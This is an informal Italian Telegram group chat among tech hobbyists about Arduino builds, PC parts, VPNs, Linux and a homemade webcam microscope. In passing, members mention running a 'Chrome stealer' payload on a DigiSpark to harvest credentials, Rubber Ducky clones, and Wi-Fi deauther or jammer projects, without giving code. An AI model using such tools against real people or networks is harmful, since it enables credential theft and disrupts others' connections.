E normalmente per scrivere 
 fai 
Ma non posso utilizzare i caratteri in ASCII e castarli?
Scusate ragazzi ho in mano questo che dovrebbe essere un condensatore
Oltre a 250v non capisco niente 
1 mega ohm Di Resistenza
Quanti μf è??🤔
Non so
Lol
Volevo farvi qualcosa di stupido ma mi interessava sapere i μf
Raga con una PowerBank da 10.000 mA un raspberry pi3 quanto dura?
Non te lo possiamo dire
Dipende da cosa ci fai col Raspberry e da che OS usi
Raspbian con Bluetooth off
Può durare 20 minuti come una settimana
Più o meno
Dipende da cosa ci vuoi fare
fai un conto, consuma circa 3W di corrente
Acquistato un Lenovo thinkpad yoga
in media, mentre lavora con la cpu al 50% tipo
Eh... E perché richiede minimo un alimentatore da 13W? Altrimenti si downclocka da solo
sisi, ma infatti, non puoi fare una media vera, io la metto come se stesse acceso facendo poco niente
Mh capisco 🤔
faacendo un conto, ponendo 3W di consumo(in idle praticamente) arrivi a farci sulle 16 ore
Mmm ok
a massimo carico sulle 3 ore e mezza

Secondo voi, nelle fiere dell'elettronica, si trovano Rubber Ducky?
Possibile
si vede dal monitor 
Renato é bellissimo
Ha fatto una live con saddytech anche
MMMMMM 🤔
Si vede anche un pezzo di pancia con cravatta se è per questo
Che è?
 come va con le crypto?
Raga
Mia mamma ha trocato un sito. Allora,li dice che se io vado a studiare nella loro scuola possono insegnare programmazione. Non c'è  scritto cosa insegnano proprio,solo la cosa che insegnano  fare programmi. Io sono confuso,dato che non so che programmazione  dovranno insegnare. Cosa mi conigliate?
Ma sbaglio o anche la mirai ha fatto più di un tb/s?
Bo
Hahahahahahahaha
I Photoshop quelli fatti bene mi dicono
 ma tu gestisci 
 su insta?
Si
Complimenti per la guida sulla crittografia! Fatta molto bene
Grazie :D
Una cosa non ho capito... Come mai da una stringa si può calcolare l'ash ma dall'Ash non si può calcolare la stringa??
E' l'algoritmo che e' fatto cosi'. Si puo' calcolare l'hash di qualsiasi file e di qualsiasi dimensione ottenendo sempre una stringa di una lunghezza definita, chiaramente e' possibile che capitino delle collisioni (come sono gia' capitate con MD5 e SHA-1), per cui le informazioni che sono contenute all'interno di quei caratteri non bastano a ricostruire un file intero
Ahh figo
maaa tipo prendere con photoshop la sagoma e spiaccicagliela sopra
Cosa ne pensate
mmhh...mai avuto un ryzen, comunque, riguardo alla mobo...iiil modello "B" non è mai un buon segno...nel senso che se non sbaglio con la B si contrassegnano quelle relativamente peggiori(pur essendo di fascia medio-alta), comunque sembra buono dai, il raffreddamento della arctic non saprei, apparte a quello t'apposct
Sto impazzendo con il php
E mi esce questo
Io voglio far uscire Numero Sconosciuto
Aaaa
Ho capito
eeee noon ho praticamente mai programmato in php quindi non so, ne sparo una, mettendo "==" nell'if?
Dovevo mettere ==
ecco
Siii mi sono sbagliato
Che mobo consiglieresti
php non mi piace 
boh une delle serie H o Z sempre stesse o una 370, ci sta
Funziona?
In alto hai una striscia colorata, cos'è?
Figo
Serve il root?
Manda
Evita questa build
L' Alimentatore fa schifo cambialo
Prendi un cougar vtx da 450w o un be quiet system Power da 450w
Mobo metti una asrock b350 pro4
Ram prendile anche solo da 2666 MHz (l'importante è che siano due banchi)
Tutto il resto può andare bene
250+100
qualcuno ha idea di dove io possa trovare una usb hub moooolto ma moooolto piccola?
Cinesi is the wae
Ho appena ordinato 8000mAh di batterie 

3×2000mAh
E altre sparse
no ma mi serve proprio qualcosa che ci stia in 5 x 3 x 1.5 centimetri
compresi arduino, le due usb e un botto di cavi e cavetti
Per tarare il joystick nel video ha aggiunto 2 e sottratto 10 alla lettura degli assi, però a me serve tenere i valori stabili tra lo zero e 1023... Facendo ciò alla fine si trova 1033
Perché non dovrebbe?
Help, ti conviene costruirtelo
Quante porte? 2?
zizi, 2 usb in 1
in realtà ho bisogno di far accendere l'arduino + 1 dispositivo usb(staccato dall'arduino) entrambi con una usb che esce dal pc, volevo fare la cosa bellinamente senza doverci attaccare 2 usb
e tra l'altro...immagino di non poter connettere l'usb a 4 pin (di cui un gnd e un vcc) all'arduino e far passare tutti i dati per la micro usb dell'arduino, no?
non sono neppure lontanamente in grado di autocostruirmelo
Ah
apparte che mi ci vogliono un botto di condensatori e quant'altra componentistica che non ho
ma sinceramente farmelo da me occuperebbe più spazio che comprarne uno di quelli grossi anche...
Non puoi farlo da te
Hai bisogno delle schede
Ma io mi sparo....
Come lo faccio a far riconoscere al IDE di arduino ?
installi i driver
E sai dove trovarli per favore
Sono con debian
hahaha, no
Grazi infinite del semi supporto
La hai presa su banggod ?
Se si nella pagina ci sono i driver
HAHAHAAHHAHAHAHAAHHAHAA madonna santa
No su amazon 3 a 10€
Povero tasto sin
Se sai il nome cercarlo su Google
Sto cercando ma pennsavo qualcuno gia lo avesse
Cerca su internet trovi tutto
Io ho messo su il payloads del Chrome stealer ed è troppo figo trovarsi l'email del DigiSpark
ba dum bash
Ahhh git hub
Quanto lo odio

...
Ba dum $
Why
Credo sempre dei conflitti
Ma poi io mi chiedo... Hai milioni di dispositivi infettati, perché non li usi per minare bitcoin anziché mandare off un sito inultimente..
\ban
Almeno ti fai un pó di money
Qualcuno vuole muorire
Ah
 qualcuno sa dirmi perchè apposto di avviarsi il cmd per poi i tool della nirsoft. Si avvia la gestione disco?
Vedo che c'è un errore nella powershell
Quindi controlla la sintassi
Ok
Metti qualche delay che se no debuggi domani
Magari se lo eviti di taggare..
Calmati
Ahahahahahah
è l'admin anti-tag inutili 
Ma crea uno userbot che risponda in questo modo in ogni messaggio che inizi con "@ romboli"
ah
ok
Ahahahahah più che altro mi rompe il cazzo che le persone pensano che ha solo la vita di YouTube
🤔🤔🤔
Bisogna avere una vps
Allora fatevi i fatti vostri io lo taggato perchè di certo ne capisce meglio di voi e con me compreso. Poi se mi vuole rispondere ben per lui.
dove credi che hosti il suo sito?
basta heroku
potrebbe anche pagare tipo altervista
non credo proprio
Non credo neanche io
Ma chi lo sa
e poi usa WordPress quindi
comunque ha una vps
E questa sarebbe l'idea essenzialmente, dentro nascosto ci sta un arduino leonardo pro micro e io volevo da tutto ciò far uscire una singols usb, oora...per un usb hub normale non c'è spazio...
Soprattutto contando il casino di cavi che ci sta già ora...idee?
e con "idee" si intende link amazon o quant'altro da cui posso comprare delle nano hub di dimensioni piccolissime con magari delle porte femmine usb che tornano sempre utili per le connessioni
Cosa dovrebbe fare tutto sto casino?
è un microscopio...il potenziometro serve per controllare la fonte di luce, il blocco con la vite per fochettare e poi dentro ci sta l'arduino leonardo pro micro che scarica e fa partire in automatico da internet con il terminale e bitsadmin il programma che ho scritto in cpp con opencv per il microscopio e lo esegue sempre da cmd
ora mi manca solo il "evitare di avere 2 usb da inserire nel pc.....mi turba alquanto questa cosa"
Tutto sto casino per risparmiare quanto?
Sono sicuro che sono stato reportato
Raga mi sa che si è buggato tutto... mi sono arrivati 6 messaggi uguali dalla Wind
'n che zenzo?
Un Microscopio quanto costa? In totale quanto hai pagato per farlo con Arduino?
voglio dire...tutto quel che uso è roba cannibalizzata ad altra roba :D
un microscopio ottico sta sui 150 euro di solito...ma anche di più senza problemi, con ciò che ho fatto l'unica cosa che fin'ora ho pagato è l'arduino a 3 euro, il resto è roba trovata in giro nel laboratorio di mio zio che era messa la a fare polvere
e poi il telaio l'ho stampato in 3d invece, quello avrò speso tipo 5 euro, buttali li
eliminato dalle chat e basta 
s/robot/lamer
beh, se vuoi reportalo
Bello lo sfondo 
Grazie mille
voi cosa preferite tra eachine e56 e eachine e52?
52
Anche se onestamente fanno schifo entrambi
shish
a me non piace il controllo a una mano
cosa ne pensate?
penso che l'i5 non sia compatibile con la mobo
Prendi 2x4gb di ram
ok
comunque avevo ragione
la mobo supporta processori di sesta e settima generazione
L'hdd credo mia meglio WD
Non riesci a prendere un SSD?
L'alimentatore forse è da cambiare, aspetto uno più esperto
Quoto
tipo con cosa?
vorrei rimanere nei 700 massimo 750 euro
io sapevo che erano meglio i seagate
Io i WD
 
 
 
come mai non va bene l'alimentatore?
la ram invece dici può andare bene?
?
cosa ne dici?
al posto del seagate c'è èun wd blue, al posto dell'i5 figo c'è un i5 7500 NON K
e le ram sono queste ^
nada?
La SSD come dicevano prima da mettere ora o in un futuro
LSD
Eh?
Ajoo
- alcolici
Scusate dovevo vedere se c'era qualcosa sopra lo scaffale
Non mi fido....

Sto cercando un robo per il telefono/controller ma non lo trovo
Mannaggia a me
Se sei disordinato
No ma ho il posto per tutte le scatole ma non c'è
Mi sa che l'ho buttato
Uff
Ricorda...... sciroppo cade basso come l'md
Wat
Seguendo questa canzone schifosa......il cavetto è in basso
Easy no?
ok
ma l'alimentatore?
Ho bisogno di un grande aiuto, secondo voi è meglio IPVanishVPN nordvpn o expressvpn. Come velocità sicurezza e torrent?
ops... si è scollegato un cavo
Aiuto
questo tizio ha creato un "pc" a 8bit su breadboard
Bellissimo
si avevo visto anch'io il suo video
Nessuno mi può dare consiglio?
NordVPN è buona assai
Chi mi evoca?
Ah, è tipo di 3 milioni di anni fa 
Ma è veloce come von perché io sto usando da circa un anno IPVanishVPN ma ho letto qua e là che dicono che ha sede in usa e quindi non va tanto bene
:(
AHAHAHAHHAHA pt.2

Preparatevi alla morte:
Cosa fa una biro in bici?
Im 
Stavo leggendo che expressvpn è la migliore vpn, boh sarà vero?
e niente, vado a suicidarmi
Ho letto che logga
Tutte le vpn devono loggare... Devono poter identificare quello che fai su internet, altrimenti saresti completamente anonimo e se commettessi dei reati non ti potrebbero rintracciare
Tra qualche ora tornerò attivo come una volta
non tutte
Ah boh 
 dice che è sicura
alcune non sono obbligate a loggarti
dipende dal paese in cui hanno i server
NordVpn è in uno stato con polite molte leggere per quanto riguarda la sicurezza informatica. Quindi loro non so obbligati a fornire i Log alle forze di polizia
Vale per tutti i server?
Tipo per il server in Italia non vale la legge italiana?
Penso che i Log siano nella loro sede non in Italia
Non va bene per niente
Ho appena sottoscritto nordvpn
Non ti fidare di quello che trovi sul World wild web che parlano di vpn
Ottima scelta
Grazie spero di trovarmi bene
È proprio quello il senso
Tu le paghi per farsi i cazzi loro 
Io sinceramente al momento non ho voglia di spendere soldi per vpn
L'omertà mafiosa fatta in internet
Piuttosto faccio diversi account prova da 3h
Ma a che servono?
Bella roba se tenessero traccia dei reati che commetti... Sai nei paesi senza libertà di parola come cadrebbero teste?
Coprono le tue attività nel www
Camuffano l'ip
Mi interessa la sicurezza di internet
Quindi non ti tracciano
E visto che le migliori sono situate in paesi come Panama....
Teoricamente non tutte
Ti sei dimenticato snowden?
Non si è mai sicuri o anonimi al 100%
Ci sarà sempre la falla nel sistema, ma non dovuta a un problema del pc, ma all'errore umano
Più che altro le attività dove bisogna pagare con carta di credito o PayPal
Hai pagato con PayPal?🤦‍♂️
Si
Nordvpn si può pagare anche con paysafecard
Mi sei caduto
Lo so perché è tutto tracciato, però appunto faccio una vpn per essere un po’ più sicuro per attività on line di e commerce
Non hackeri l' NSA con il miglior sistema operativo al mondo chiamato Kali?
Certo, ma i log credevo dovessero esserci in ogni caso
Ce l’ho installato su raspberry ma non ci capisco tanto. 
Pure Tu dimenticato snowden?
Spero di non aver capito.....
Ma dai hahhaha
Zitto
Aspetta un po'
Vediamo cosa risponde
Sono arrivato a installarlo, poi un apt-get update && apt-get upgrade e poi non so fare più nulla
Ti faccio il tutorial?
Purtroppo non sono tanto afferrato su Linux anche se mi interesserebbe tanto. Uso principalmente Windows 10 al lavoro e nel tenmpo libero macOS
Okay, allora...
Prendi la SD con Kali
Sono riuscito anche con un’altra sd a mettere ubuntu mate e sistemare il bug degli aggiornamenti
Formatta la SD con Kali e mettici sopra raspbian
Problema risolto 
Ah, dimenticavo.....poi datti un pugno per aver installato Kali
 capito adesso?
Si..
Penso che ubuntu sia un po’ meglio di raspbian. 
Che alla fine tutti noi, almeno una volta nella vita, abbiamo scaricato Kali
Per poi tornare alla retta via
Comunque preferisco parrot
Madonna che schifo Kali
No
Debian semplice tutta la vita
Ma anche no
Poi installi tu i tool che ti servono
Non sono d'accordo
Debian non mi piace, proprio GNOME non mi piace
Purtroppo abbiamo visto tutti mr robot
Purtroppo?!
E poi ci sono io che non posso installare un Ubuntu in dual perchè non trovo una chiavetta in giro per casa ._.
Serio?
Nel senso che è magnifico e continuo a rivederlo perchè ci sono dettagli nelle serie precedenti che ti aiutano a capire gli altri episodi
Eh
Ma che problemi hai?
Una chiavetta che avevo si è sminchiata
Se lo vuoi mettere veramente la vai a comprare
Economici
Meno di 10€
Ahahahahah
V A P O R W A V E
Vomito
É bello

È tamarro
É vaporwave
O per il gusto di farlo crashare
La mia propic ci sta alla perfezione
Ahahahah
Yea
Ci credo, sei giallo
Fighissimo aiuto, come hai fatto
É tutto viola
Lo ho scaricato... Di mando il file in pvt ?
È Telegram X?
Nope
Manda
Nel dubbio gira anche a me 
Che dite? Debian o arch da mettere su PC?
Arch
Ho avuto una brutta esperienza
Tipo?
Ahahah
Formattato la partizione sbagliata
Non ho mai avuto voglia di finire il film e approfondire la sua storia quindi ne so poco
Exit please
Perdonatemi Mi pento dei miei peccati
Rimediare subito
si ma non ho capito perchè 
ma hahahahahahaahah
quando capisci di aver usato il file .avi da 99GiB invece che convertirlo prima in un .mp4 da 20MiB
Sto esportando il video e di solito ci mette una mezz'oretta... Ma qua mi segna 3h37 rimanenti 
è?
ma c'è l'articolo sul blog 
HAHAHAAHAAHAHHAAHSHAAHSHAHAH
In realtà sono mp4 ma da una quarantina di gb totali

DVD is da uei
maaa tipo come con ffxv con risoluzione originaria 8K?
non capisco... ha taggato gente a caso
in realtà lo fa spesso, quindi al prossimo parte il warn 
Era d'obbligo
Come minimo


SI – 15
 88%

NO – 2
 12%

 17 people voted so far.
non è politica non bannatemi
è solo un sondaggio
se votate o no
Io nn sono maggiorenne
*CHI NON  È MAGGIORENNE NON DEVE METTERE NIENTE
 hai fatto tu la tua foto profilo o hai scaricato l'immagine?
Scusate ragazzi, ma ho bisogno di un consiglio serio 
 posso scriverti in pvt? Scusa ancora, ma non è qualcosa che non riesco a fare io, ma una cosa SERIA
Pulizia Kontatti!!1!1!1!
Dai non sono nemmeno helper che cazz
magari avessi quei laser davvero 
scaricata
Ah ok A me sta per arrivare un laser viola da 50mw
Era l'indice di gradimento per quel sondaggio
Da 1 a 5 stelle
ahaha
manda link
Ecco a te: 
grz
È solo il diodo, mettilo in un tubo da elettricista con un interruttore
ci ho messo tipo 5 minuti a capire il perchè del warn
Non è giusto
Votate anche voi contro l'ingiustizia della mano


Giusta – 7
 44%

Chissenefrega – 5
 31%

Ingiusta – 2
 13%

The wae – 2
 13%

 16 people voted so far.
In realtà poteva essere un riferimento ad un partito, quindi hanno ragione
Ora crasha premiere
90%
ripeto votate sul sondaggio
ma a che ti serve? 🤔
Fino alle 23:00 no politica
così curiosità
Tanto arriverà per forza qualcuno che dirà "voi chi votate o avete votato?"
e verrà bannato perchè il voto è segreto 
c'è una regola ben precisa
Puoi anche decidere di dirlo se vuoi
vabeh, ban comunque perchè sono malvagio
96%
È segreto per diritto, non per dovere
Up
okok
98
Una differenza che molti non colgono
adesso crasha premiere.....
Minchia l'hai chiamata
Si è messo in pausa da solo
Veramente?

Probabilmente un thermal throttle
Comunque sembra avercela fatta
Si ma io ho dato la preferenza al sondaggio
cit.
Ah giusto 
Alziamo la mano destra a mo' di saluto romano
votiamo per lei anche se non c'è nè bisogno signora mano
Davvero ci sono 10 persone maggiorenni
🤨
Romboliiii
Sai che tipo ci sto pensando da un sacco di tempo che Enomis mi pare un nome familiare e poi oggi mi accorgo che è simonE al contrario
Ahahahahahah
Tu non immagini quante persone lo capiscono in ritardo
Mmmmmmmmmmmmmmmmmmmmmm
È vero... Non mi sono mai accorto
In questo gruppo minimo 4 persone
Comuuuuuuuunque
perché scrivere Simone al contrario?🤷‍♂
Perché è più figo 
Ahahahahah
Io me ne sono fregato perche mi pareva uno di quei username fighi
Però sembrava figo ammettilo 
L'ho notato adesso
Enomis = simonE
Sembrava appunto
Ahahahahah
 hai aperto il vaso di Pandora 
Comunque mi avete confermato  quanto è figo enomis
A quanto pare si
Sorry mano❤️
Aspettate sono una battuta
Non mi bannate
Addiosss
Ok mano
Io lo muterei
Comunque c'è davvero qualcuno che segue tutta la notte porta a porta per vedere chi vince?
Io forse seguo Mentana in compagnia
Cioè dalle *boh * alle 6
 è una bufola?
Nowayyy
Cosa CE DA SEGUIREEEEE
Cioè tutta la notte
🤷‍♂
Ah boh, per stare in compagnia
Esiste la birra per quello
Anche quella
Ch'io sappia Microsoft ci sta provando
Ci è riuscito?
Beh se può esistere un nesso DNA segnale allora potrebbe essere
Mi piacciono un sacco ste robe biologia/informatica
Fai Bioinformatica allora
Il problema è che ancora devo iniziare le superiori 
Lo vedrai poi
Comunque ci avevo pensato 
Ecco ahahh
Anche se penso che bioinformatica non si trovi molto in Italia
Non lo so, però è figo
Yup figo.. Una mia amica studia bioinformatica ad Heidelberg
Allo scoccare delle 23 immagino i flame che partiranno
C'è nanotecnologie al Politecnico, c'è Biologia in Statale e da noi ad informatica c'è un corso di Bioinformatica
Invece no, stasera tutti a guardare la 
Dov'è? 
Buona fortuna
Eheh una "amica"
In Germania
Amica amica amica
Ah ok
due minuti
In bici
wooo ho anche beccato una buona priorità di processing
Marco e cicca lo sapete che viene human safari al galilei?
solo 5min di elaborazione ed è on
Lo so lo so
Lo ho detto a marco stamattina proprio
Non so quanto lo pagano però
ieri sera
Boh, non credo tanto
Mi infiltrerò
Anzi, magari gli scrivo in pvt e lo porto a mangiare un pizza la sera 
Creato da 
Uh si beh
Vengo anchd io 
Cicca che si autoinvita 
E ti becchi i big laiks
E i viaggi gratis
Hahaha ma proprio col cazzo 
I viaggi con gli iscritti sono il modo migliore per spennare gli altri youtuber
Pepo ci ha già mollato tipo 7000€ 
Ma tipo Marcello e Franz che sono quasi sempre con lui, quanti soldi hanno
Io mica pago per andare in viaggio con marco.... Casomai dovrebbe pagarmi lui per sopportare i suoi vlog
Mi ispira...
Ora per punizione te li fa anche editare 
Credo debba pagare anche noi che sopportiamo ogni suo video
Ecco 
Ma voi potete scegliere di non vederli...
(tanto amore eh marco ❤)
Ogni suo ritardo...
Io li guardo per vedere te 
Oow ❤
Rendete admin quest'uomo
Avete presente che a video la saldatura si può vedere? Se invece delle maschere tradizionali si usa tipo un visore con una videocamera apposita, non si potrebbe ovviare al problema?
ragazzi ho realizzato un progetto simile alla rubber ducky
per chi fosse interessato non esiti a contattarmi, anche perché, appunto, l' ho realizzato esclusivamente io quindi so tutto e di più a riguardo 
la videocamera deve avere comunque il vetro apposito davanti se no non vedi niente di cio che stai saldando se non le scintille
Mica il vetro scuro?
Perché volevo fare così per vedere dall'inizio alla fine
beh si, quello
dovrebbe potersi fare
Mi conviene imparare il go?
Se ti va, tieni conto che è un linguaggio giovane
Nah
Ok
Rust is better
Però non si vedrebbe bene
Comunque si vede scuro
vedi come con la maschera ne più nè meno, aggiungi solo un passaggio
quello di cui tu hai bisogno sono delle maschere apposite regolate elettronicamente che a una certa soglia di luce accendono/spengono il filtro luce
Io volevo fare così per vedere dove saldavo, perché una volta abbassata la maschera si va un po' a caso
 
Grazie a Huawei e China Mobile, sul Monte Everest è presente la connessione ad alta velocità LTE
E in Italia nulla 
con una videocamera e il vetro non cambia niente, devi come ti ho detto prova usare quelle maschere speciali
beh ma attraverso la maschera ci vedi....voglio dire, appena tocchi vedi in 
 quel che stai saldando....credo che comunque più di così non si possa fare, e di certo con una webcam o cose del genere non vedi meglio🤔
si può aprire un file zippato col CMD?
Aprire file dentro archivio rar dal CMD?
ciao a tutti qualcuno ha utilizzato il raspberry per fare video sorveglianza con motioneye os?
A parte la domanda cretina, quali sono gli step per creare un linguaggio di programmazione?
nessuno che mi puo aiutare?
Devi creare un interprete
Prima devi effettuare la tokenizzazione, ovvero la divisione delle diverse istruzioni in comandi che il linguaggio di partenza (credo che tu stia usando Python) possa capire. In seguito, bisogna controllare gli errori di sintassi, e se non ce ne sono, si prosegue con l'esecuzione dei comandi imperativamente
Vedi 
Ecco, stavo per linkarlo
Si quando saldi si... Ma proprio a vedere il punto iniziale
Ah e io sono nelle elite di pyteens *coff*
Ma io no 
Fidati io mi ci ritrovo per caso
Cosa decisamente complessa, ci sono interi corsi a riguardo. Se vuoi approfondire ti consiglio "linguaggi di programmazione - principi e paradigmi"
Ah, buono a sapersi
Eccomeeeee
Lo conosco
Cioè in realtà credo che mi abbiano messo per fare qualcosa, quando avrò tempo libero sicuramente la prima priorità sarà lavorare per loro
Io non ho letto neanche una riga di codice dell'interprete di Nylo ._.
Io ho letto la documentazione, NON SI CAPISCE UNA MINCHIA
Cioè se vuoi capire qualcosa devi per forza chiedere a veggero
Ah, pensavo fossi l'unico degradato mentale che non avesse capito quella roba
(Mannaggia al congiuntivo: fossi 1a pers. sing.)
E non lo sei
idem
Infatti, durante le interrogazioni di Storia sono peggio
Mi sono ricordato la presa di Fiume da parte di Gabriele D'Annunzio grazie ai meme del Superuovo
E le poche cose che so le so grazie a lui
ottimo
Mah, era giusto per curiosità
Cerco un programmatore in php che voglia scrivere guide per chi vuole imparare
MA USATE PYTHON!!!
Anche python
Se vuoi fare le guide contattami
se devi fare backend per un sito e non vuoi spendere soldi per una vps o servizi di hosting a pagamento, ti ritrovi ad usare altervista e quindi obbligato ad usare php
Eh, 
no money no good server
Cos'è?
Cose bielle per <18 anni
comunque python è uno dei migliori linguaggi per backend (non che ci voglia molto ad essere meglio di php o js)
Tu in che programmi?
Principalmente Python, Javascript (Vanilla - NodeJS - Vue) e occasionalmente utilizzo la Marcatura HTML/CSS
Ti andrebbe di scrivere guide? In cambio ti sponsorizziamo
Js forse no
Php ovvio
Ah, e un tempo anche PHP purtroppo
js per backend fa schifo quanto php, per frontend... è la causa principale per cui un sito è lento e pesante. Per il resto 

ma linguaggi web?
quel link, che mandai già mesi fa in questo gruppo insieme ad un altro sempre su js e la sua inutilità
perchè c'è anche java no?
java merda
Se potessi essere onnisciente lo farei, ma non posso per il semplice fatto del tempo, ho un progetto in cantiere che prima vorrei concludere
Ti dico io quanto mi è rimasto del corso Sololearn fatto e concluso in 2 giorni 
Ho un'infarinatura generale, ma non potrei mai mettere mani su un'applicazione per il debug
Pensaci, per ora abbiamo più di 1800 membri
Ho un applicazione Android che, scansionando un sensore, riporta la glicemia... Voi dite che si riesce a prendere il codice e metterlo su un arduino/Raspberry per usarlo?
Mi serve fare un sistema automatico con esso
Ehm, chiedi al Signor Reverse Engineering
Non so cosa sia xD illustra
Il Reverse Engineering è l'arte di prendere un certo sistema e capirne il funzionamento a ritroso, un po' come faresti per disegnare un circuito elettrico data una PCB con i componenti saldati sopra
Ah capito
Grazie
Ovviamente tu puoi utilizzare Zio Google per aiutarti
L'applicazione è fatta solamente che, quando scansioni il sensore, ti dà il valore
Io volevo fare che sia sempre in costante controllo
In modo che ci siano anche degli allarmi di ipoglicemia/iperglicemia
Vi ricordate tutti la storia del mio esp? 
 Tu si vero?
È un sistema nfc
O Arduino o Raspberry
Questo metodo ti aiuta anche nei problemi di matematica, a volte mi ha salvato il c*lo in classe
È indifferente, se si riesce a fare lo faccio subito
Si tipo i metodi bottom up ecc
Anche le mie pareti fra poco  quindi?
Ho risolto 
Non immaginerai mai cos'era
utile mi dicono
rar no, zip sì
comee????
Ma windows o linux?
mi mandi il link?
cosa intendi?
Su Linux non c'e' il cmd
Lo vuoi fare su linux o su windows?
Windows
Mm considerando che molti chiamano qurello di windows "terminale"...
aaaoh io sono sparito 
quello di windows è un terminale... malato
ma non si arriva solo all'Assembly? (se proprio va di culo, tra l'altro)
ripudi il terminale del futuro?? SUPERBO!
quindi come si fa?
Emmm.... Ho un problemino
yup
Ho installato Debian ma non ha l’ambiente grafico...
dicici
lo installi con apt, che problema c'è
Come ?
Normalmente ?
comunque di solito non chiede che DE si vuole durante l'installazione?
é impossibile tornare al sorgente
Si forse è perché non avevo attaccato il cavo Ethernet...
come un qualsiasi programma. Cerca su internet i nomi giusti dei pacchetti che servono per il DE che vuoi installare (ce ne sono diversi di DE, devi sceglierne uno)
Il cavo
cioé bastava cambiare cavo? 
Si
AH.
Tu non immagini quante bestemmie
sisi immagino 
Ho anche comprato la versione 1.0!
È possibile che Instagram non abbia IoT tra le categorie? 
È giovane rispetto agli altri social, e buggatissimo direi per l'aggiunta
Facebook è la stessa cosa eh
Anzi, Instagram per le pagine aziendali si basa proprio su su Facebook, devi prima creare una pagina Facebook e poi partendo da quella puoi crearla anche su Instagram
Però su Instagram non ci sono 50enni buongiornonissimi
Infatti io la pagina Facebook per il momento non ho il minimo interesse a toccarla
Ho creato quella su Insta per avere una community più forte
Questo articolo potrebbe piacerti: Hot sale Colorful iGame GTX1080Ti Vulcan AD 11GB Video Graphics Card 1594/1708MHz forNIER *. 
Aggiungilo alla tua lista dei desideri! 
 

Come è possibile
Rido
????
Una 1080Ti custom di una marca sconosciutissima a 5€
Se te la spediscono ti spediscono un criceto e una ruota nel casing della 1080
Nessuno mi può dare una mano non Motioneye os?
Quindi non posso onorare il dux ?
Ragazzi, come funziona per gli acquisti su Bangood, quale metodo di spedizione conviene scegliere?
Si paga la dogana?
Devo fare un acquisto dal magazzino it-cn
Altra domanda... Qualcuno ha esperienza con tastiere formato 60%?
Come sono?
Belle se non devi giocare
Mi servirebbe principalmente per programmare e temo mi mancheranno le frecce direzionali classiche, cosa ne pensi?
Uhm... Si ti mancheranno
Raga ho trovato un anuncio in un canale dove cercano dei programnatori dei bot,che brutto che io non lo sono
Questo non puoi farlo a prescindere perché il fascismo in Italia è illegale 
Perfetto 
Ma l'ironia...
Non penso che ci sia il bisogno di scherzare su certi argomenti, o almeno non qui grazie
Ad esempio, selezionare più righe di testo tramite il tasto shift e spostandosi con le frecce risulta difficile?
Si
Ma ma ma
Percaso qualcuno di voi ha già provato a installare i circuiti integrati in Arduino Uno?
Fate admin quest'.... Ah no che lo è già

+183727

Ma tipo che bisogna cambiare combinazione di tasti, o risulta difficile all'atto pratico di premere i tasti nella combinazione richiesta?
Secondo me si... Risultata difficile
Ok... Ma hai una 60%?
La ho provata per un mesetto
Poi sono tornato ad una 100%
Quale avevi provato?
Una aukey
Ee si fanno progressi qua
Sarebbe ?

Stampato e messo il blocco della fotocamera, ora manca solo la vite e una luce migliore da sotto, devo andare a cannibalizzare altra robba per trovare altri led bianchi
Ma a cosa serve
Cosa stai makeando?
è un microscopio :D
Wut
ora mi manca solo la vite per tenerla ferma...tenendola in mano posso vedere il mio battito cardiaco e dopo un po' da noia questa cosa
Ci sono riuscito!
cosa cosa?
É strano come microscopio
k, alle 23 sparo il più bel video da 15 secondi che si sia mai visto su berlusconi che vota
Ahahahah
why? è pur sempre un microscopio ottico...solo che è fatto con una webcam a lenti invertite, se sapessi anche un po' di ottica aumenterei gli ingrandimenti ma sai com'è, non so manco con quale magggia funzionino le lenti io :D
Maggggggia
il mio prossimo progetto saranno i rain goggles di william
 questi
sbaglio o il video che si trova su 
 lagga?
devo segnalarlo a 
 ?
A me non lagga
Eh i lag del video non possiamo farci nulla
Giusto
ok 
Hahahaha
si scusate si era chrome, dovevo semplicemente riavviarlo
Raga esiste un sistema per controllare il raspberry tramite interfaccia grafica da IOS
Senza l’utilizzo di reti wifi esterne tipo esiste un sistema che crea una propria rete e collegandoti trami un app lo controlli
Puoi creare un Access Point, collegarti all'IP del Raspberry e controllarlo tramite delle API
Esiste già un progetto?
Puoi fartelo da solo
Basta creare un Hotspot e creare la parte comunicante come se fosse sotto una rete wifi normalissima
nop, si vede benissimo
in che senso il battito cardiaco
In che senso vedere il battito cardiaco
Che la mano si muove a causa del sangue che scorre a pulsazioni
E quelle pulsazioni sono quelle generate dal cuore quando pulsa
Allora la frase e formulata male
Grazie ma come le vedi
Vero 
 ??
Vedi muoversi la roba
Vedi la tua mano che si muove leggermente involontariamente
Si ma non "vedi il battito cardiaco"
E questo tremolio si trasmette anche agli oggetti tenuti in mano
Ma va
Non l'avrei mai detto
È un po' formulata male ma comunque praticamente la mano si scuote seguendo il battito cardiaco
Ok volevo chiarire solo questo
Io ho risposto a 
yeep
Comunque con un microscopio tenuto in mano questo tremolio aumenta e cio è molto fastidioso perché non resta a fuoco l'oggetto da osservare giusto?? 

iin realtà avendo la man ferma riesci a tenerlo a fuoco, infondo stiamo parlando solo di 230 ingrandimenti qua, però vedi tipo il tremolio ogni paio di secondi e poi torna a fuoco e da noia, comunque, vorrei anche evitare di farmi venire i crampi alle mani e quindi mi serve una vite

ok però alle 23 sondaggio politico
ci pensiamo su
si beh, non è che alle 23:01 si può mandare affanculo un politico, eh
infatti non ho intenzione di scatenare scontri tra voi del gruppo anzi il contrario un rapido sondaggio con un semplice ragionamento dietro
"con un semplice ragionamento dietro" mi sa tanto di minaccia
no 

Ragazzi
E se esagerate i warn partono lo stesso 
(assolutamente NON rivolto a Giulian )
Progetti da fare con: Arduino uno, due micro, esp32, ESP 8266?
pff, putin is the wae
attaccargli la 220
oppure comprare un altro arduino accaso e trasmettere dati tra i 2 arduini perchè è divertente
Ti propongo una cosa....
Mi viene istantaneamente in mente Domotica
Continua....
Copiare un segnale e rinviarlo
Che ne dite? Fattibile?
Oppure su un ESP installi Deauther e sull'altro MicroPython, così sei pronto ad ogni evenienza ._.
wifi jammer 
vedo che mi capisci internamente
Fatto oggi 
Micropyton?
emmh...si...il problema è riceverlo, se hai una radio am ci puoi riuscire, anche se non so quanto sia buona una trasmissione in am con le onde quadre, comunque è sicuramente fattibile finchè si sta a corto-medio raggio

Medio raggio
Io ho comprato i 433hz
Allora flasha MicroPython per programmarlo in Python
Sulla micro?
Programmi per creare cose in 3d semplice da usare e leggero da scaricare ci sta?
allora trasmetti ad alte frequenze, ma non è divertente così, io avrei trasmesso sui 2MHz con un pin analogico :/
